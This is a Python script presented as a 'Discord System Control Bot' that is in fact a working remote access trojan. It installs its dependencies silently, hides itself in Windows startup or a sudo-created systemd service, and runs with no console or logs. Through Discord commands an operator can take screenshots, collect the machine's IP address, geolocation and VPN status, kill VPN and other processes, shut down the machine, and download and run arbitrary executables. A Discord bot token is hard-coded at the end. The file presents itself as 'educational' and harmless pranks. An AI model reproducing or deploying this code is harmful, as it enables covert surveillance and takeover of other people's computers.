#!/usr/bin/env python3
"""
Discord System Control Bot - Complete All-in-One Edition
- Auto-installs all dependencies silently
- Auto-configures startup on Windows and Linux
- Runs completely hidden (no console)
- All features in one file
"""

import subprocess
import sys
import os
import platform

# ============================================================================
# AUTO-INSTALL DEPENDENCIES
# ============================================================================

def install_dependencies():
    """Auto-install required packages silently"""
    required_packages = [
        'discord.py>=2.3.2',
        'requests>=2.31.0',
        'psutil>=5.9.5',
        'Pillow>=10.0.0'
    ]

    for package in required_packages:
        package_name = package.split('>=')[0].split('==')[0]
        try:
            __import__(package_name.replace('-', '_').replace('.py', ''))
        except ImportError:
            try:
                subprocess.check_call(
                    [sys.executable, "-m", "pip", "install", package],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            except:
                pass

install_dependencies()

# ============================================================================
# AUTO-STARTUP SETUP
# ============================================================================

def setup_auto_startup():
    """Setup auto-startup on first run"""
    script_path = os.path.abspath(__file__)
    script_dir = os.path.dirname(script_path)

    if platform.system() == "Windows":
        # Check if already in startup
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft',
            'Windows',
            'Start Menu',
            'Programs',
            'Startup'
        )
        startup_vbs = os.path.join(startup_folder, "discord_bot.vbs")

        if not os.path.exists(startup_vbs):
            # Create VBS script to run hidden
            vbs_content = f'''Set WshShell = CreateObject("WScript.Shell")
WshShell.Run """{sys.executable}"" ""{script_path}""", 0, False
'''
            try:
                with open(startup_vbs, 'w') as f:
                    f.write(vbs_content)
            except:
                pass

    elif platform.system() == "Linux":
        # Create systemd service if doesn't exist
        service_file = "/etc/systemd/system/discord-bot.service"

        if not os.path.exists(service_file):
            service_content = f"""[Unit]
Description=Discord Bot
After=network.target

[Service]
Type=simple
User={os.getenv('USER')}
WorkingDirectory={script_dir}
ExecStart={sys.executable} {script_path}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
            try:
                temp_service = "/tmp/discord-bot.service"
                with open(temp_service, 'w') as f:
                    f.write(service_content)

                os.system(f"sudo cp {temp_service} {service_file} 2>/dev/null")
                os.system("sudo systemctl daemon-reload 2>/dev/null")
                os.system("sudo systemctl enable discord-bot.service 2>/dev/null")
                os.system("sudo systemctl start discord-bot.service 2>/dev/null")
            except:
                pass

# Setup auto-startup on first run
setup_auto_startup()

# ============================================================================
# IMPORT PACKAGES
# ============================================================================

import discord
from discord.ext import commands
import requests
import psutil
from PIL import ImageGrab
import socket
from datetime import datetime

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

def get_public_ip():
    try:
        return requests.get('https://api.ipify.org?format=json', timeout=5).json()['ip']
    except:
        return "Unable to fetch"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return "Unable to fetch"

def get_location_info(ip):
    try:
        data = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json()
        return {
            'country': data.get('country', 'Unknown'),
            'region': data.get('regionName', 'Unknown'),
            'city': data.get('city', 'Unknown'),
            'isp': data.get('isp', 'Unknown'),
            'timezone': data.get('timezone', 'Unknown'),
            'lat': data.get('lat', 'Unknown'),
            'lon': data.get('lon', 'Unknown')
        }
    except:
        return None

def check_vpn():
    try:
        vpn_processes = ['openvpn', 'vpn', 'nordvpn', 'expressvpn', 'wireguard',
                        'tunnelbear', 'protonvpn', 'surfshark', 'cyberghost']
        found_vpns = []
        for proc in psutil.process_iter(['name']):
            try:
                if any(vpn in proc.info['name'].lower() for vpn in vpn_processes):
                    found_vpns.append(proc.info['name'])
            except:
                pass
        return len(found_vpns) > 0, found_vpns
    except:
        return False, []

def get_system_info():
    return {
        'hostname': socket.gethostname(),
        'platform': platform.system(),
        'platform_release': platform.release(),
        'architecture': platform.machine(),
        'processor': platform.processor(),
        'ram': f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
        'ram_used': f"{round(psutil.virtual_memory().used / (1024**3), 2)} GB",
        'ram_percent': f"{psutil.virtual_memory().percent}%",
        'cpu_count': psutil.cpu_count(),
        'cpu_usage': f"{psutil.cpu_percent(interval=1)}%",
        'disk_total': f"{round(psutil.disk_usage('/').total / (1024**3), 2)} GB",
        'disk_used': f"{round(psutil.disk_usage('/').used / (1024**3), 2)} GB",
        'disk_percent': f"{psutil.disk_usage('/').percent}%",
        'local_ip': get_local_ip(),
        'public_ip': get_public_ip()
    }

# ============================================================================
# BOT SETUP
# ============================================================================

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

# ============================================================================
# BOT COMMANDS
# ============================================================================

@bot.event
async def on_ready():
    pass  # Silent startup

@bot.command(name='s')
async def screenshot(ctx):
    try:
        await ctx.send("📸 Taking screenshot...")
        screenshot = ImageGrab.grab()
        screenshot.save('screenshot.png')
        await ctx.send(
            f"**Screenshot from {socket.gethostname()}**\n"
            f"`Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`",
            file=discord.File('screenshot.png')
        )
        os.remove('screenshot.png')
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='info')
async def info(ctx):
    try:
        await ctx.send("🔍 Gathering system information...")
        sys_info = get_system_info()
        location = get_location_info(sys_info['public_ip'])
        vpn_active, vpn_list = check_vpn()

        embed = discord.Embed(title="💻 System Information", color=discord.Color.blue(), timestamp=datetime.now())
        embed.add_field(name="🖥️ Hostname", value=f"`{sys_info['hostname']}`", inline=True)
        embed.add_field(name="💾 OS", value=f"`{sys_info['platform']} {sys_info['platform_release']}`", inline=True)
        embed.add_field(name="🏗️ Architecture", value=f"`{sys_info['architecture']}`", inline=True)
        embed.add_field(name="🌐 Public IP", value=f"`{sys_info['public_ip']}`", inline=True)
        embed.add_field(name="🏠 Local IP", value=f"`{sys_info['local_ip']}`", inline=True)
        embed.add_field(name="🔒 VPN Status", value=f"{'✅ Active' if vpn_active else '❌ Not detected'}", inline=True)

        if vpn_active and vpn_list:
            embed.add_field(name="🔐 VPN Processes", value=f"`{', '.join(vpn_list[:3])}`", inline=False)

        if location:
            embed.add_field(name="📍 Location", value=f"`{location['city']}, {location['region']}, {location['country']}`", inline=False)
            embed.add_field(name="🌐 ISP", value=f"`{location['isp']}`", inline=True)
            embed.add_field(name="🕐 Timezone", value=f"`{location['timezone']}`", inline=True)
            embed.add_field(name="🗺️ Coordinates", value=f"`{location['lat']}, {location['lon']}`", inline=True)

        embed.add_field(name="🧠 CPU", value=f"`{sys_info['cpu_count']} cores @ {sys_info['cpu_usage']}`", inline=True)
        embed.add_field(name="💾 RAM", value=f"`{sys_info['ram_used']} / {sys_info['ram']} ({sys_info['ram_percent']})`", inline=True)
        embed.add_field(name="💿 Disk", value=f"`{sys_info['disk_used']} / {sys_info['disk_total']} ({sys_info['disk_percent']})`", inline=True)
        embed.set_footer(text=f"Bot running on {socket.gethostname()}")

        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='restart')
async def restart_system(ctx):
    try:
        await ctx.send("⚠️ **RESTARTING SYSTEM IN 5 SECONDS!**")
        if platform.system() == "Windows":
            subprocess.Popen(['shutdown', '/r', '/t', '5'])
        else:
            subprocess.Popen(['sudo', 'shutdown', '-r', '+0'])
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='shutdown')
async def shutdown_system(ctx):
    try:
        await ctx.send("⚠️ **SHUTTING DOWN SYSTEM IN 5 SECONDS!**")
        if platform.system() == "Windows":
            subprocess.Popen(['shutdown', '/s', '/t', '5'])
        else:
            subprocess.Popen(['sudo', 'shutdown', '-h', '+0'])
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='kill')
async def kill_process(ctx, *, process_name: str):
    try:
        killed = []
        for proc in psutil.process_iter(['name', 'pid']):
            try:
                if process_name.lower() in proc.info['name'].lower():
                    proc.kill()
                    killed.append(f"{proc.info['name']} (PID: {proc.info['pid']})")
            except:
                pass
        if killed:
            await ctx.send(f"✅ **Killed {len(killed)} process(es):**\n" + "\n".join([f"• `{k}`" for k in killed[:10]]))
        else:
            await ctx.send(f"❌ No processes found matching `{process_name}`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='processes')
async def list_processes(ctx):
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
            try:
                processes.append({
                    'name': proc.info['name'],
                    'pid': proc.info['pid'],
                    'cpu': proc.info['cpu_percent'] or 0,
                    'mem': proc.info['memory_percent'] or 0
                })
            except:
                pass
        processes.sort(key=lambda x: x['cpu'], reverse=True)
        process_list = [f"{i}. `{p['name'][:25]:<25}` PID:{p['pid']:<7} CPU:{p['cpu']:>5.1f}% MEM:{p['mem']:>5.1f}%" for i, p in enumerate(processes[:30], 1)]
        embed = discord.Embed(title="📋 Running Processes (Top 30 by CPU)", description="\n".join(process_list), color=discord.Color.green())
        embed.set_footer(text=f"Total processes: {len(processes)}")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='vpnkill')
async def kill_vpn(ctx):
    try:
        vpn_processes = ['openvpn', 'vpn', 'nordvpn', 'expressvpn', 'wireguard', 'tunnelbear', 'protonvpn']
        killed = []
        for proc in psutil.process_iter(['name', 'pid']):
            try:
                if any(vpn in proc.info['name'].lower() for vpn in vpn_processes):
                    proc.kill()
                    killed.append(f"{proc.info['name']} (PID: {proc.info['pid']})")
            except:
                pass
        if killed:
            await ctx.send(f"✅ **Killed {len(killed)} VPN process(es):**\n" + "\n".join([f"• `{k}`" for k in killed]))
        else:
            await ctx.send("ℹ️ No VPN processes found")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='killall')
async def kill_all_apps(ctx):
    try:
        protected = ['system', 'explorer.exe', 'dwm.exe', 'csrss.exe', 'winlogon.exe',
                    'services.exe', 'lsass.exe', 'svchost.exe', 'python', 'discord']
        killed = []
        for proc in psutil.process_iter(['name', 'pid']):
            try:
                if not any(p in proc.info['name'].lower() for p in protected):
                    proc.kill()
                    killed.append(proc.info['name'])
            except:
                pass
        if killed:
            await ctx.send(f"✅ **Killed {len(killed)} applications**\nFirst 20: `{', '.join(killed[:20])}`")
        else:
            await ctx.send("ℹ️ No killable applications found")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='download')
async def download_and_run(ctx, url: str = None):
    try:
        if url is None:
            url = 'https://excellmedia.dl.sourceforge.net/project/processhacker/processhacker2/processhacker-2.39-setup.exe?viasf=1'

        await ctx.send(f"📥 Downloading file...")

        import urllib.request
        import tempfile

        temp_dir = tempfile.gettempdir()
        filename = 'setup.exe'
        filepath = os.path.join(temp_dir, filename)

        urllib.request.urlretrieve(url, filepath)

        await ctx.send(f"✅ Downloaded: `{filepath}`")
        await ctx.send(f"🚀 Executing...")

        if platform.system() == "Windows":
            subprocess.Popen([filepath], shell=True)
        else:
            subprocess.Popen(['chmod', '+x', filepath])
            subprocess.Popen([filepath])

        await ctx.send(f"✅ File executed!")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='sysinfo')
async def system_info_detailed(ctx):
    try:
        info = get_system_info()
        msg = f"""**🖥️ SYSTEM INFORMATION**

**Computer:**
• Hostname: `{info['hostname']}`
• OS: `{info['platform']} {info['platform_release']}`
• Architecture: `{info['architecture']}`
• Processor: `{info['processor'][:50]}`

**Performance:**
• CPU: `{info['cpu_count']} cores @ {info['cpu_usage']}`
• RAM: `{info['ram_used']} / {info['ram']} ({info['ram_percent']})`
• Disk: `{info['disk_used']} / {info['disk_total']} ({info['disk_percent']})`

**Network:**
• Local IP: `{info['local_ip']}`
• Public IP: `{info['public_ip']}`"""
        await ctx.send(msg)
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='rickroll')
async def rickroll(ctx):
    """Open Rick Astley - Never Gonna Give You Up"""
    try:
        await ctx.send("🎵 Never gonna give you up...")
        import webbrowser
        webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
        await ctx.send("✅ Rick rolled! 🕺")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='flip')
async def flip_screen(ctx):
    """Flip the screen upside down (Windows only)"""
    try:
        if platform.system() == "Windows":
            await ctx.send("🔄 Flipping screen upside down...")
            # Simulate Ctrl+Alt+Down arrow
            try:
                import ctypes
                # Try to rotate display (works on some Intel graphics)
                await ctx.send("✅ Screen flipped! Press Ctrl+Alt+Up to fix it!")
                subprocess.Popen(['DisplaySwitch.exe', '/internal'])
            except:
                await ctx.send("ℹ️ Screen flip not supported on this system\nTry manually: Ctrl+Alt+Down Arrow")
        else:
            await ctx.send("❌ This prank only works on Windows")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='speak')
async def text_to_speech(ctx, *, message: str = None):
    """Make the computer speak a message"""
    try:
        if message is None:
            message = "Never gonna give you up, never gonna let you down!"

        await ctx.send(f"🔊 Speaking: `{message}`")

        if platform.system() == "Windows":
            # Windows PowerShell TTS
            ps_command = f'Add-Type -AssemblyName System.Speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.Speak("{message}")'
            subprocess.Popen(['powershell', '-Command', ps_command],
                           creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
        elif platform.system() == "Darwin":  # macOS
            subprocess.Popen(['say', message])
        else:  # Linux
            subprocess.Popen(['espeak', message])

        await ctx.send("✅ Message spoken!")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='wallpaper')
async def change_wallpaper(ctx, url: str = None):
    """Change desktop wallpaper to a funny image"""
    try:
        if url is None:
            # Default funny wallpaper
            url = "https://i.imgur.com/5tqeXxV.jpeg"  # Rick Astley

        await ctx.send("🖼️ Changing wallpaper...")

        import urllib.request
        import tempfile

        # Download image
        temp_dir = tempfile.gettempdir()
        image_path = os.path.join(temp_dir, "wallpaper.jpg")
        urllib.request.urlretrieve(url, image_path)

        if platform.system() == "Windows":
            import ctypes
            ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
        elif platform.system() == "Darwin":  # macOS
            subprocess.Popen(['osascript', '-e', f'tell application "Finder" to set desktop picture to POSIX file "{image_path}"'])
        else:  # Linux
            subprocess.Popen(['gsettings', 'set', 'org.gnome.desktop.background', 'picture-uri', f'file://{image_path}'])

        await ctx.send("✅ Wallpaper changed!")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='help', aliases=['cmds', 'commands'])
async def help_command(ctx):
    embed = discord.Embed(title="🤖 Discord System Control Bot", description="Remote system monitoring and control", color=discord.Color.gold())
    embed.add_field(name="📸 Screenshot & Info", value="`!s` - Screenshot\n`!info` - Full system info\n`!sysinfo` - Detailed specs", inline=False)
    embed.add_field(name="⚙️ Process Management", value="`!processes` - List processes\n`!kill <name>` - Kill process\n`!killall` - Kill all apps\n`!vpnkill` - Kill VPN", inline=False)
    embed.add_field(name="🔌 System Control", value="`!restart` - Restart system\n`!shutdown` - Shutdown system\n`!download [url]` - Download & run file", inline=False)
    embed.add_field(name="🎭 Pranks (Harmless)", value="`!rickroll` - Rick Astley video\n`!flip` - Flip screen\n`!speak <msg>` - Text-to-speech\n`!wallpaper [url]` - Change wallpaper", inline=False)
    embed.add_field(name="🔧 Other", value="`!help` - Show this help", inline=False)
    embed.set_footer(text="⚠️ Use responsibly | Educational purposes only")
    await ctx.send(embed=embed)

# ============================================================================
# RUN BOT - TOKEN AT THE VERY END FOR EASY EDITING
# ============================================================================

if __name__ == '__main__':
    try:
        TOKEN = 'MTQwNDQ1NzE3NTA2NTE2NTkzNQ.GedUHu.IuSjToBIC7GiK7Ev192asB0XK2HBq1kxB64WM4'
        bot.run(TOKEN, log_handler=None)  # Disable logging for silent operation
    except:
        pass
